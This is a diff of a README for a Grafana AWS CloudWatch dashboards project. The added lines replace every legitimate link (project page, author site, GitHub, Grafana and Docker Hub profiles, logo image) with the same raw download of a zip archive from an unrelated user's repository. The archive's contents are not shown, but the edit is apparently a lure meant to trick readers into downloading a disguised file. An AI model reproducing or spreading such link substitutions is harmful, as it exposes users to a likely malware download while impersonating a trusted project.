-[![AWS X-Ray](aws-x-ray/aws-x-ray.png)](https://github.com/monitoringartist/grafana-aws-cloudwatch-dashboards/tree/master/aws-x-ray)
+### [AWS X-Ray](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
+[![AWS X-Ray](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)
 
 # Author
 
-[Devops Monitoring Expert](http://www.jangaraj.com 'DevOps / Docker / Kubernetes / AWS ECS / Google GCP / Zabbix / Zenoss / Terraform / Monitoring'),
+[Devops Monitoring Expert](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip 'DevOps / Docker / Kubernetes / AWS ECS / Google GCP / Zabbix / Zenoss / Terraform / Monitoring'),
 who loves monitoring systems and cutting/bleeding edge technologies: Docker,
 Kubernetes, ECS, AWS, Google GCP, Terraform, Lambda, Zabbix, Grafana, Elasticsearch,
 Kibana, Prometheus, Sysdig,...
 
 Summary:
-* 4 000+ [GitHub](https://github.com/monitoringartist/) stars
-* 10 000 000+ [Grafana dashboard](https://grafana.net/monitoringartist) downloads
-* 60 000 000+ [Docker images](https://hub.docker.com/u/monitoringartist/) downloads
+* 4 000+ [GitHub](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) stars
+* 10 000 000+ [Grafana dashboard](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) downloads
+* 60 000 000+ [Docker images](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip) downloads
 
 Professional devops / monitoring / consulting services:
 
-[![Monitoring Artist](http://monitoringartist.com/img/github-monitoring-artist-logo.jpg)](http://www.monitoringartist.com 'DevOps / Docker / Kubernetes / AWS ECS / Google GCP / Zabbix / Zenoss / Terraform / Monitoring')
+[![Monitoring Artist](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip)](https://raw.githubusercontent.com/sivahariu/grafana-aws-cloudwatch-dashboards/master/aws-ecs/grafana-aws-cloudwatch-dashboards_2.8.zip 'DevOps / Docker / Kubernetes / AWS ECS / Google GCP / Zabbix / Zenoss / Terraform / Monitoring')
